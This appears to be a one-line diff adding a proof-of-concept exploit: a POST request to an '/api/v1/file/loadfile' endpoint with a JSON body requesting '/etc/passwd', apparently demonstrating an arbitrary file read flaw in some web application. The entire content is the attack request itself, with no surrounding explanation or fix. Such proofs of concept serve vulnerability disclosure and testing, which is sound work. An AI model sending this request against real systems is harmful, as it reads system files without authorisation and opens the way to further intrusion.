@@ -1,0 +1,1 @@
+POC: POST /api/v1/file/loadfile {"paht":"/etc/passwd"}
